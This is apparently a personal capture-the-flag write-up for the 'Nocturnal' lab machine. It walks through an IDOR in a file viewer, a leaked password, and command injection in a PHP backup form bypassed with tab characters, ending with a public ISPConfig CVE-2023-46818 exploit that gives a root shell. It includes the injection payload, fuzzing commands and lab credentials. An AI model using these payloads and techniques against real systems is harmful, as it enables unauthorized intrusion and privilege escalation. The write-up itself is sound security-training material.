A classic Linux CTF focusing on web enumeration/exploitation

# Enumeration
## Nmap
after trying out some ports I made this scan
```bash
$ nmap -sC -sV 10.10.11.64 -p22,80,443
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-15 14:55 CEST
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.070s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp closed https
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Adding Vhost
when we try to access the page we get 302
```bash
$ curl 10.10.11.64 -v
..Snip..
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sun, 15 Jun 2025 12:49:46 GMT
< Content-Type: text/html
< Content-Length: 154
< Connection: keep-alive
< Location: http://nocturnal.htb/
```

let's go ahead and add the domain to our `/etc/hosts` file
```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

## HTTP Server
after visiting http://nocturnal.htb/ we get greeted with a web app for storing documents. Let's have a closer look.
- Possible SQLi for `/login.php` or `/register.php` *but skipped testing for now.*
- upon logging in we get redirected to `/dashboard.php` where we can upload files
	did some testing for file Upload attacks but the files don't seem to get executed. 
- While trying to find a way to execute uploaded files I found `/view.php` which had a few interesting Parameters
### /view.php 
On the dashboard we can access uploaded files via a link to `/view.php?username=porotscho&file=document.odt` which let's us Download the file.

But when we refer to file that doesn't exist we can list our files.
![[Screenshot 2025-06-15 153746.png]]

Maybe this skips authentication? Let's make another account and see if we can see his files.

Logged in as "porotscho1" we can make a request to `/view.php` with the username parameter set to "porotscho"

![[Screenshot 2025-06-15 153746 1.png]]

Awesome now that we have a PoC we can see if there are more users on the system

```bash
$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -b "PHPSESSID=ve8i9dq6npjbjobi3epjlvl7ks" -fs 2985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=.pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=ve8i9dq6npjbjobi3epjlvl7ks
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 26ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 30ms]
```

In Amanda's files I found a file called privacy.odt the contents have an important clue for us

> [!privacy.odt]
> Dear Amanda,
> 
> Nocturnal has set the following temporary password for you: **arHkG7HAI68X8s1J**. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
> The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us. 
> Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
>
> Yours sincerely, 
> Nocturnal's IT team

Awesome now we can login as Amanda! We should also note that the password has been set for all of her services maybe that could be Important later? 

# Vulnerability Assessment
After logging Into Amanda's account I got access to `/admin.php` which was a true gold mine because we can look at source code! After looking at the source code of `/admin.php` I found a Command Injection vulnerability in the Backup function.

```php
<?php
session_start();

//..Snip..

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
?>

//..Snip..

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

	</div>
        
        <?php if (isset($backupMessage)) { ?>
            <div class="message"><?php echo $backupMessage; ?></div>
        <?php } ?>
    </div>
</body>
</html>
```

The Processed Command would look something like this

```bash
zip -x './backups/*' -r -P $password $backupFile > $logFile 2>&1 &
```


So the `cleanEntry()` Function is missing some characters. One of them is `'` or `"` we can abuse this to comment everything after the $password variable.

# Exploitation
After Some testing I came up with this Payload:
```http
POST /admin.php?view=admin.php HTTP/1.1
Host: nocturnal.htb
Content-Length: 20
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://nocturnal.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nocturnal.htb/admin.php?view=admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=2fc6l62taqjpn5mfm09nqmhldb
Connection: keep-alive
backup=&password=123	backups/backup_2025-06-10.zip	../	>	output.txt	'
```

**Explanation:**
- Sends a Post Request to nocturnal.htb with a backup and password Parameter.
- Backup Parameter
	Initiates a Backup
- Password Parameter:
	- Use 123 as the password
	- Use *Tab* Instead of *Space* to get around Input sanitization
	- Save the Backup in the same directory as usual
	- Instead of saving the ./ directory I gave it ../
	- Finally saved the output so that I can see if the command worked in the output

# Post Exploitation
In the extracted backup I found a folder called `nocturnal_database` inside I found a Database.

![[Pasted image 20250701152544.png]]

Let's see If we can crack they're hashes...

![[Pasted image 20250701155310.png]]

Awesome! Let's try if this password works on the SSH server

# Privilege Escalation
After poking around a bit I found weird service running on port 8080 that was only accessible locally.
```bash
tobias@nocturnal:~$ ss -tuln
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
..Snip..
tcp    LISTEN  0       4096         127.0.0.1:8080         0.0.0.0:*            
```

After some further digging I found out that the service is called ISPConfig. Let's forward the port and find out what we can do with it.

```bash
ssh tobias@nocturnal.htb -L 8081:127.0.0.1:8080
```

Awesome now lets have a look at it!

![[Pasted image 20250701172817.png]]

Seems to be default ISPConfig and we need a password for it. Luckily we have already found some so we should try them out.

After Some trial and error I found out that it is the default username for ISPConfig and Amanda's Password

After looking around in the admin Panel I found out that the ISPConfig Version is outdated
![[Pasted image 20250701173446.png]]

After searching the internet for exploits I found a really good one on [GitHub](https://github.com/bipbopbup/CVE-2023-46818-python-exploit) 

```bash
┌─[]─[10.10.14.63]─[janosch@pwnbox]─[~/notes/nocturnal/exploit/CVE-2023-46818-python-exploit]
└──╼ [★]$ python exploit.py http://127.0.0.1:8081/ admin slowmotionapocalypse
[+] Target URL: http://127.0.0.1:8081/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# whoami
root
```

# Conclusion
I dunno xD